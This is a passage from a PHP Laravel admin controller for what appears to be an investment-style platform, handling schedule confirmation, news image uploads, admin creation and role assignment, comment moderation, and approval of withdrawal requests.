            $schedules = Schedule::where('date', $date)->orderByDesc('status')->paginate(\Config::get('constants.paginate.admin'));
            if (!$schedules) {
                return back()->withErrors(['No date match found']);
            }
            $page_title .= $date->format(\Config::get('constants.date_format'));
        } else {
            return back()->withErrors(['No search term found']);
        }
        return view('admin.schedule', compact('page_title', 'schedules','blog'));
    }

    public function scheduleConfirm(Request $request)
    {
        $request->validate(['id' => 'required|integer']);
        $schedule = Schedule::findOrFail($request->id);
        $schedule->invest()->update([
            'status' => 1
        ]);
        return back()->withSuccess('Client schedule has been confirmed. client interest cycle has been started.');
    }

    public function newsImage(Request $request)
    {
        $request->validate([
            'image' => 'required|image|mimes:jpeg,jpg,png,gif',
            'lang' => 'required|in:ja,pt-br',
        ]);
        try {
            $path = 'assets/images/blog/img';
            if (!file_exists($path)) {
                mkdir($path, 0755, true);
            }
            $news_image = time() . uniqid() . '.' . $request->image->getClientOriginalExtension();
            $general = GeneralSettings::first();
            Image::make($request->image)->resize(551, 346)->save($path . '/' . $news_image);
            if ($request->lang == 'ja') {
                if (file_exists(asset($path . '/' . $general->news_ja_image))) {
                    unlink($path . '/' . $general->news_ja_image);
                }
                $general->update(['news_ja_image' => $news_image]);
            } else {
                if (file_exists(asset($path . '/' . $general->news_pt_image))) {
                    unlink($path . '/' . $general->news_pt_image);
                }
                $general->update(['news_pt_image' => $news_image]);
            }
        } catch (\Exception $th) {
            return back()->withErrors(['Image could not be uploaded.']);
        }
        return redirect()->route('knowledge-base.index')->withSuccess('Image has been updated.');
    }


    //Admins Management

    public function addnewadminview()
    {
        $page_title = "Add New Admin";
        return view('admin.admins.add', compact('page_title'));
    }

    public function addnewadminAction(Request $request)
    {
        $request->validate([
            'name' => 'required',
            'password' => 'required|min:5',
            'email' => 'required | unique:admins,email',
            'username' => 'required | unique:admins,username',
            'mobile' => 'required',
        ]);

        $name = $request->name;
        $email = $request->email;
        $mobile = $request->mobile;
        $username = $request->username;
        $password = bcrypt($request->password);

        DB::table('admins')->insert(
            ['name' => $name, 'email' => $email, 'mobile' => $mobile, 'username' => $username, 'password' => $password]
        );

        $message = 'Welcome! ' . $name . '. Your user name is: ' . $username . ' and password is: ' . $request->password;


        send_email($email, $name, 'New Admin', $message);

        return back()->withSuccess('Admin Addedd Successfully.');

    }

    public function displayAllAdmins()
    {
        $page_title = "All Admins";
        $user = DB::table('admins')->where('id', '!=', 1)->get();
        return view('admin.admins.all', compact('page_title', 'user'));
    }

    public function displayhomecomments()
    {
        $page_title = "All Comments";
        $comments = DB::table('home_comments')->orderBy('created_at', 'DESC')->get();
        return view('admin.displaycomments', compact('page_title', 'comments'));
    }

    public function varifycomment(Request $request)
    {

        DB::table('home_comments')->where('id', $request->id)->update(['status' => 1]);

        return back()->withSuccess('Comment Varified Successfully.');
    }

    public function deletecomment(Request $request)
    {

        DB::table('home_comments')->where('id', $request->id)->delete();

        return back()->withSuccess('Comment Deleted Successfully.');
    }

    public function assignRole(Request $request)
    {
        $page_title = "Assign Roles to Admin";
        $roles = DB::table('admin_features')->get();
        $id = $request->id;

        $assignedrole = DB::table('admin_roles')->where('admin_id', $id)->pluck('admin_feature_id')->toArray();

        return view('admin.admins.assignroles', compact('page_title', 'roles', 'id', 'assignedrole'));
    }

    public function assignRolesAction(Request $request)
    {

        $request->validate([
            'id' => 'required | exists:admins,id',
        ]);

        DB::table('admin_roles')->where('admin_id', $request->id)->delete();

        if (isset($request->dashboard)) {

            DB::table('admin_roles')->insert(
                ['admin_id' => $request->id, 'admin_feature_id' => $request->dashboard]
            );

        }
        if (isset($request->affiliate)) {

            DB::table('admin_roles')->insert(
                ['admin_id' => $request->id, 'admin_feature_id' => $request->affiliate]
            );

        }
        if (isset($request->schedules)) {

            DB::table('admin_roles')->insert(
                ['admin_id' => $request->id, 'admin_feature_id' => $request->schedules]
            );

        }
        if (isset($request->depositmethods)) {

            DB::table('admin_roles')->insert(
                ['admin_id' => $request->id, 'admin_feature_id' => $request->depositmethods]
            );

        }
        if (isset($request->manageepin)) {

            DB::table('admin_roles')->insert(
                ['admin_id' => $request->id, 'admin_feature_id' => $request->manageepin]
            );

        }
        if (isset($request->planmanagement)) {

            DB::table('admin_roles')->insert(
                ['admin_id' => $request->id, 'admin_feature_id' => $request->planmanagement]
            );

        }
        if (isset($request->newsblog)) {

            DB::table('admin_roles')->insert(
                ['admin_id' => $request->id, 'admin_feature_id' => $request->newsblog]
            );

        }
        if (isset($request->miniblog)) {

            DB::table('admin_roles')->insert(
                ['admin_id' => $request->id, 'admin_feature_id' => $request->miniblog]
            );

        }
        if (isset($request->manageterms)) {

            DB::table('admin_roles')->insert(
                ['admin_id' => $request->id, 'admin_feature_id' => $request->manageterms]
            );

        }
        if (isset($request->manageusers)) {

            DB::table('admin_roles')->insert(
                ['admin_id' => $request->id, 'admin_feature_id' => $request->manageusers]
            );

        }
        if (isset($request->manageadmins)) {

            DB::table('admin_roles')->insert(
                ['admin_id' => $request->id, 'admin_feature_id' => $request->manageadmins]
            );

        }
        if (isset($request->withdrawsystem)) {

            DB::table('admin_roles')->insert(
                ['admin_id' => $request->id, 'admin_feature_id' => $request->withdrawsystem]
            );

        }
        if (isset($request->managegallery)) {

            DB::table('admin_roles')->insert(
                ['admin_id' => $request->id, 'admin_feature_id' => $request->managegallery]
            );

        }
        if (isset($request->supporttickets)) {

            DB::table('admin_roles')->insert(
                ['admin_id' => $request->id, 'admin_feature_id' => $request->supporttickets]
            );

        }
        if (isset($request->pages)) {

            DB::table('admin_roles')->insert(
                ['admin_id' => $request->id, 'admin_feature_id' => $request->pages]
            );

        }
        if (isset($request->websettings)) {

            DB::table('admin_roles')->insert(
                ['admin_id' => $request->id, 'admin_feature_id' => $request->websettings]
            );

        }
        if (isset($request->subscriber)) {

            DB::table('admin_roles')->insert(
                ['admin_id' => $request->id, 'admin_feature_id' => $request->subscriber]
            );

        }
        if (isset($request->settings)) {

            DB::table('admin_roles')->insert(
                ['admin_id' => $request->id, 'admin_feature_id' => $request->settings]
            );

        }

        return back()->withSuccess('Roles Updated Successfully.');

    }

    //    CPS
    public function index()
    {
        $page_title= 'CPS Withdraw Requests';
        $user_cont = User::get()->count();
        $total_slots = Slot::where('status', '1')->get()->count();
        $deposit_total  = CPSDeposit::where('deposite_status',1)->sum('amount');
        $withdraw_total  = CPS_Withdraw::where('withdraw_status',1)->sum('amount');
        $withdraw_pending  = CPS_Withdraw::where('withdraw_status',0)->sum('amount');
        $Withdraws  = CPS_Withdraw::with('user')->get();

        return view('admin.dashboard',compact('Withdraws','withdraw_pending' ,'deposit_total','total_slots','withdraw_total','page_title'));
    }
    public function cpsWithdrawAjax(Request $request)
    {
        $page_title = 'Withdraw Requests';
//        dd($request->all());
        if ($request->ajax()) {

            if (!empty($request->get('id')) && $request->get('withdrawStatus') && $request->get('user_id')) {

                $id = $request->get('id');
                $user_id = $request->get('user_id');
                $user = User::where('id', $user_id)->first();


                $model = CPS_Withdraw::where('id', $id)->update(['withdraw_status' => 1,'withdraw_approved_time'=> Carbon::now()]);
//
                return ["error" => null, 'success' => '200'];
            } else {
                return ['error' => 409];
            }
        }

    }


    public function subscribed_Package_Admin()
    {

        $page_title  = 'User Subscribed Packages List';
        $Packages  = SlotPackageSubscribe::with('user','packages')->get();

        return view('admin.slot_packages.subscribed_user_packages',compact('Packages','page_title'));
    }

}
